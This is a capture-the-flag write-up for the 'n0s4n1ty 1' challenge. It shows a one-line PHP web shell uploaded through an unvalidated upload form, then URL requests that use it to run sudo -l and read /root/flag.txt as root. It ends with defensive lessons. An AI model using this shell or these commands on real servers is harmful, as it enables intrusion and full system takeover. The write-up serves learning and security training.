## ðŸ¥§ Challenge Overview

**n0s4n1ty 1** is a web exploitation challenge focused on file upload vulnerabilities. The hint suggests that the upload function isnâ€™t properly sanitized, and that we should check `sudo -l` once we get shell access.

Weâ€™re given a web interface with a basic file upload form:

<img src="/n0s4n1ty-1/webview.png" alt="n0s4n1ty 1 Challenge" style={{ width: "100%" }} />

The objective: upload a file to get a shell on the server and escalate privileges to read the flag.

## ðŸ§© Exploitation Steps

### 1. Test the Upload Feature

We start by uploading a benign image file (e.g., `.jpg` or `.png`) to test how the app handles file extensions.

<img src="/n0s4n1ty-1/upload-jpg.png" alt="n0s4n1ty JPG Upload" style={{ width: "100%" }} />

It successfully uploads and shows us the storage path:

```
uploads/7aa3640aed08fd4572f0a38c0dd56846.jpg
```

<img src="/n0s4n1ty-1/jpg-upload-results.png" alt="n0s4n1ty Upload Success" style={{ width: "100%" }} />
<img src="/n0s4n1ty-1/jpg-upload-paths.png" alt="n0s4n1ty JPG Uploaded" style={{ width: "100%" }} />

This confirms that we can access uploaded files directly.

---

### 2. Upload a PHP Shell

Next, we upload a PHP file with a simple web shell:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

We name it `payload.php` and upload it like before.

---

### 3. Confirm Code Execution

We navigate to the file:

```
http://<host>/uploads/payload.php
```

At first, it throws:

```
Warning: shell_exec(): Cannot execute a blank command...
```

This confirms the shell is working.

To list files:

```
http://<host>/uploads/payload.php?cmd=ls
```

Output:

```
7aa3640aed08fd4572f0a38c0dd56846.jpg payload.php
```

We now have remote command execution.

---

### 4. Check for Sudo Access

Letâ€™s run `sudo -l` to see if we can escalate:

```
http://<host>/uploads/payload.php?cmd=sudo+-l
```

It returns:

```
User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL
```

This means we can run any command as any user â€” no password required. Full root access is possible.

---

### 5. Access the `/root` Directory

With root privileges, we try listing `/root`:

```
http://<host>/uploads/payload.php?cmd=sudo+ls+-la+/root
```

And we see:

```
flag.txt
```

---

### 6. Read the Flag

Now, we grab the flag directly:

```
http://<host>/uploads/payload.php?cmd=sudo+cat+/root/flag.txt
```

<img src="/n0s4n1ty-1/flag.png" alt="n0s4n1ty Flag" style={{ width: "100%" }} />

Mission complete.

## ðŸ§  Final Thoughts

This challenge walks us through a classic case of unvalidated file uploads â€” a critical and common vulnerability in web apps. Combined with dangerous `sudo` misconfigurations, itâ€™s a reminder that small oversights in development can lead to full system compromise.

Key takeaways:
- Always validate and sanitize uploaded files
- Never grant NOPASSWD sudo access to untrusted services
- Basic PHP shells are still effective in controlled CTF scenarios
